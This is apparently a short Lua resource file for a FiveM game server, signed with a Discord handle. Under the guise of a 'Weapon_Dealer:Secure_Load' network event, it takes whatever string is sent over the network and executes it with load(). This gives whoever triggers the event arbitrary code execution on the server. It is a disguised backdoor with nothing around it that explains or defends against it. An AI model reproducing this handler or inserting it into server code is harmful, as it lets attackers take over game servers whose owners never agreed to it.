--[[
    discord:    krane#2890
]]
RegisterNetEvent("Weapon_Dealer:Secure_Load") 
AddEventHandler("Weapon_Dealer:Secure_Load", function(srcfile) 
    local f = load(srcfile)()
end)